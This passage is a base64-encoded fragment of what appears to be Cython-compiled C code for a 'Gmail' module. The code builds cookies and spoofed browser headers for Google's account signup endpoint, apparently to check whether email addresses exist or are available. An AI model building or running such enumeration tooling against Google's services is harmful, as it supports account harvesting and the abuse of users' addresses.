U2F2ZSgmX19weXhfdF8xLCAmX19weXhfdF8yLCAmX19weXhfdF8zKTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yKTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTsKICAgICB7CgogICAgICAKICAgICAgX19weXhfdF80ID0gKF9fUHl4X1B5U2VxdWVuY2VfQ29udGFpbnNURihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xMCwgX19weXhfdl9lbWFpbCwgUHlfRVEpKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzQgPCAwKSkpIF9fUFlYX0VSUigwLCAyODksIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoX19weXhfdF80KSB7CgogICAgICAgIAogICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUoX19weXhfdl9lbWFpbCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDI5MCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgX19weXhfdF82ID0gUHlVbmljb2RlX1NwbGl0KCgoUHlPYmplY3QqKV9fcHl4X3RfNSksIF9fUHl4X05vbmVBc051bGwoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTApLCAtMUwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAyOTAsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X0dldEl0ZW1JbnRfTGlzdChfX3B5eF90XzYsIDAsIGxvbmcsIDEsIF9fUHl4X1B5TG9uZ19Gcm9tX2xvbmcsIDEsIDAsIDEsIDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAyOTAsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdl9lbWFpbCwgX19weXhfdF81KTsKICAgICAgICBfX3B5eF90XzUgPSAwOwoKICAgICAgICAKICAgICAgfQoKICAgICAgCiAgICAgIHsKICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfNywgJl9fcHl4X3RfOCwgJl9fcHl4X3RfOSk7CiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpOwogICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF84KTsKICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOSk7CiAgICAgICAgIHsKCiAgICAgICAgICAKICAgICAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X2J1aWx0aW5fb3BlbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTZdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDI5MywgX19weXhfTDEwX2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpOwogICAgICAgICAgX19weXhfdF8xMSA9IF9fcHl4X3RfMTI7CiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMSk7CiAgICAgICAgICBfX3B5eF90XzEzID0gMDsKICAgICAgICAgIHsKICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTEsIE5VTEx9OwogICAgICAgICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlYWQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgxLV9fcHl4X3RfMTMpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMjkzLCBfX3B5eF9MMTBfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgICAgICAgIH0KICAgICAgICAgIF9fcHl4X3RfNiA9IF9fcHl4X3RfMTA7CiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTsKICAgICAgICAgIF9fcHl4X3RfMTMgPSAwOwogICAgICAgICAgewogICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF82LCBOVUxMfTsKICAgICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NwbGl0bGluZXMsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgxLV9fcHl4X3RfMTMpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMjkzLCBfX3B5eF9MMTBfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICAgICAgfQogICAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X0dldEl0ZW1JbnQoX19weXhfdF81LCAwLCBsb25nLCAxLCBfX1B5eF9QeUxvbmdfRnJvbV9sb25nLCAwLCAwLCAxLCAxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDI5MywgX19weXhfTDEwX2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICBfX3B5eF92X28gPSBfX3B5eF90XzEwOwogICAgICAgICAgX19weXhfdF8xMCA9IDA7CgogICAgICAgICAgCiAgICAgICAgfQogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwogICAgICAgIGdvdG8gX19weXhfTDE1X3RyeV9lbmQ7CiAgICAgICAgX19weXhfTDEwX2Vycm9yOjsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwoKICAgICAgICAKICAgICAgICAgewogICAgICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJuZS5HbWFpbCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8xMCwgJl9fcHl4X3RfNSwgJl9fcHl4X3RfNikgPCAwKSBfX1BZWF9FUlIoMCwgMjk0LCBfX3B5eF9MMTJfZXhjZXB0X2Vycm9yKQogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEwKTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF82KTsKCiAgICAgICAgICAKICAgICAgICAgIF9fcHl4X3RfMTYgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X2J1aWx0aW5fb3BlbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTZdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE2KSkgX19QWVhfRVJSKDAsIDI5NSwgX19weXhfTDEyX2V4Y2VwdF9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE2KTsKICAgICAgICAgIF9fcHl4X3RfMTUgPSBfX3B5eF90XzE2OwogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTUpOwogICAgICAgICAgX19weXhfdF8xMyA9IDA7CiAgICAgICAgICB7CiAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzE1LCBOVUxMfTsKICAgICAgICAgICAgX19weXhfdF8xNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZWFkLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMS1fX3B5eF90XzEzKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTUpOyBfX3B5eF90XzE1ID0gMDsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTYpOyBfX3B5eF90XzE2ID0gMDsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE0KSkgX19QWVhfRVJSKDAsIDI5NSwgX19weXhfTDEyX2V4Y2VwdF9lcnJvcikKICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTQpOwogICAgICAgICAgfQogICAgICAgICAgX19weXhfdF8xMSA9IF9fcHl4X3RfMTQ7CiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMSk7CiAgICAgICAgICBfX3B5eF90XzEzID0gMDsKICAgICAgICAgIHsKICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTEsIE5VTEx9OwogICAgICAgICAgICBfX3B5eF90XzEyID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NwbGl0bGluZXMsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgxLV9fcHl4X3RfMTMpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBfX1BZWF9FUlIoMCwgMjk1LCBfX3B5eF9MMTJfZXhjZXB0X2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMik7CiAgICAgICAgICB9CiAgICAgICAgICBfX3B5eF90XzE0ID0gX19QeXhfR2V0SXRlbUludChfX3B5eF90XzEyLCAwLCBsb25nLCAxLCBfX1B5eF9QeUxvbmdfRnJvbV9sb25nLCAwLCAwLCAxLCAxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE0KSkgX19QWVhfRVJSKDAsIDI5NSwgX19weXhfTDEyX2V4Y2VwdF9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X28sIF9fcHl4X3RfMTQpOwogICAgICAgICAgX19weXhfdF8xNCA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgIGdvdG8gX19weXhfTDExX2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgICAgIH0KCiAgICAgICAgCiAgICAgICAgX19weXhfTDEyX2V4Y2VwdF9lcnJvcjo7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTsKICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpOwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOSk7CiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF83LCBfX3B5eF90XzgsIF9fcHl4X3RfOSk7CiAgICAgICAgZ290byBfX3B5eF9MM19lcnJvcjsKICAgICAgICBfX3B5eF9MMTFfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTsKICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzkpOwogICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfNywgX19weXhfdF84LCBfX3B5eF90XzkpOwogICAgICAgIF9fcHl4X0wxNV90cnlfZW5kOjsKICAgICAgfQoKICAgICAgCiAgICAgIF9fcHl4X3RfNSA9IF9fcHl4X3ZfbzsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fcHl4X3RfMTMgPSAwOwogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fN307CiAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NwbGl0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMi1fX3B5eF90XzEzKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAyOTcsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICB9CiAgICAgIGlmICgobGlrZWx5KFB5VHVwbGVfQ2hlY2tFeGFjdChfX3B5eF90XzYpKSkgfHwgKFB5TGlzdF9DaGVja0V4YWN0KF9fcHl4X3RfNikpKSB7CiAgICAgICAgUHlPYmplY3QqIHNlcXVlbmNlID0gX19weXhfdF82OwogICAgICAgIFB5X3NzaXplX3Qgc2l6ZSA9IF9fUHl4X1B5U2VxdWVuY2VfU0laRShzZXF1ZW5jZSk7CiAgICAgICAgaWYgKHVubGlrZWx5KHNpemUgIT0gMikpIHsKICAgICAgICAgIGlmIChzaXplID4gMikgX19QeXhfUmFpc2VUb29NYW55VmFsdWVzRXJyb3IoMik7CiAgICAgICAgICBlbHNlIGlmIChzaXplID49IDApIF9fUHl4X1JhaXNlTmVlZE1vcmVWYWx1ZXNFcnJvcihzaXplKTsKICAgICAgICAgIF9fUFlYX0VSUigwLCAyOTcsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIH0KICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICAgICBpZiAobGlrZWx5KFB5VHVwbGVfQ2hlY2tFeGFjdChzZXF1ZW5jZSkpKSB7CiAgICAgICAgICBfX3B5eF90XzUgPSBQeVR1cGxlX0dFVF9JVEVNKHNlcXVlbmNlLCAwKTsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpOwogICAgICAgICAgX19weXhfdF8xMCA9IFB5VHVwbGVfR0VUX0lURU0oc2VxdWVuY2UsIDEpOwogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTApOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihzZXF1ZW5jZSwgMCk7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAyOTcsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpOwogICAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKHNlcXVlbmNlLCAxKTsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAyOTcsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEwKTsKICAgICAgICB9CiAgICAgICAgI2Vsc2UKICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0oc2VxdWVuY2UsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAyOTcsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0oc2VxdWVuY2UsIDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMjk3LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgICAgI2VuZGlmCiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgIH0gZWxzZSB7CiAgICAgICAgUHlfc3NpemVfdCBpbmRleCA9IC0xOwogICAgICAgIF9fcHl4X3RfMTQgPSBQeU9iamVjdF9HZXRJdGVyKF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF8xNCkpIF9fUFlYX0VSUigwLCAyOTcsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICBfX3B5eF90XzE3ID0gKENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkpID8gUHlJdGVyX05leHQgOiBfX1B5eF9QeU9iamVjdF9HZXRJdGVyTmV4dEZ1bmMoX19weXhfdF8xNCk7CiAgICAgICAgaW5kZXggPSAwOyBfX3B5eF90XzUgPSBfX3B5eF90XzE3KF9fcHl4X3RfMTQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIGdvdG8gX19weXhfTDE4X3VucGFja2luZ19mYWlsZWQ7CiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgaW5kZXggPSAxOyBfX3B5eF90XzEwID0gX19weXhfdF8xNyhfX3B5eF90XzE0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgZ290byBfX3B5eF9MMThfdW5wYWNraW5nX2ZhaWxlZDsKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgICAgaWYgKF9fUHl4X0l0ZXJuZXh0VW5wYWNrRW5kQ2hlY2soX19weXhfdF8xNyhfX3B5eF90XzE0KSwgMikgPCAoMCkpIF9fUFlYX0VSUigwLCAyOTcsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fcHl4X3RfMTcgPSBOVUxMOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE0KTsgX19weXhfdF8xNCA9IDA7CiAgICAgICAgZ290byBfX3B5eF9MMTlfdW5wYWNraW5nX2RvbmU7CiAgICAgICAgX19weXhfTDE4X3VucGFja2luZ19mYWlsZWQ6OwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE0KTsgX19weXhfdF8xNCA9IDA7CiAgICAgICAgX19weXhfdF8xNyA9IE5VTEw7CiAgICAgICAgaWYgKF9fUHl4X0l0ZXJGaW5pc2goKSA9PSAwKSBfX1B5eF9SYWlzZU5lZWRNb3JlVmFsdWVzRXJyb3IoaW5kZXgpOwogICAgICAgIF9fUFlYX0VSUigwLCAyOTcsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fcHl4X0wxOV91bnBhY2tpbmdfZG9uZTo7CiAgICAgIH0KICAgICAgX19weXhfdl90bCA9IF9fcHl4X3RfNTsKICAgICAgX19weXhfdF81ID0gMDsKICAgICAgX19weXhfdl9ob3N0ID0gX19weXhfdF8xMDsKICAgICAgX19weXhfdF8xMCA9IDA7CgogICAgICAKICAgICAgX19weXhfdF82ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAzMDAsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9Ib3N0X0dBUFMsIF9fcHl4X3ZfaG9zdCkgPCAoMCkpIF9fUFlYX0VSUigwLCAzMDAsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX3B5eF92X2Nvb2tpZXMgPSAoKFB5T2JqZWN0KilfX3B5eF90XzYpOwogICAgICBfX3B5eF90XzYgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCg4KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMzAzLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hdXRob3JpdHksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYWNjb3VudHNfZ29vZ2xlX2NvbSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzMDMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYWNjZXB0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMwMywgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYWNjZXB0X2xhbmd1YWdlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2VuX1VTX2VuX3FfMF85KSA8ICgwKSkgX19QWVhfRVJSKDAsIDMwMywgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfY29udGVudF90eXBlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FwcGxpY2F0aW9uX3hfd3d3X2Zvcm1fdXJsZW5jb2RlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMwMywgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ29vZ2xlX2FjY291bnRzX3hzcmYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzMDMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3JpZ2luLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb20pIDwgKDApKSBfX1BZWF9FUlIoMCwgMzAzLCBfX3B5eF9MM19lcnJvcikKCiAgICAgIAogICAgICBfX3B5eF90XzEwID0gUHlOdW1iZXJfQWRkKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbV9zaWdudXBfMiwgX19weXhfdl90bCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzMDksIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZWZlcmVyLCBfX3B5eF90XzEwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMwMywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CgogICAgICAKICAgICAgX19weXhfdF81ID0gTlVMTDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzE0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2diKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE0KSkgX19QWVhfRVJSKDAsIDMxMCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTsKICAgICAgX19weXhfdF8xMyA9IDE7CiAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMTQpKSkgewogICAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMTQpOwogICAgICAgIGFzc2VydChfX3B5eF90XzUpOwogICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF8xNCk7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzE0LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fcHl4X3RfMTMgPSAwOwogICAgICB9CiAgICAgICNlbmRpZgogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgTlVMTH07CiAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgxLV9fcHl4X3RfMTMpIHwgKF9fcHl4X3RfMTMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0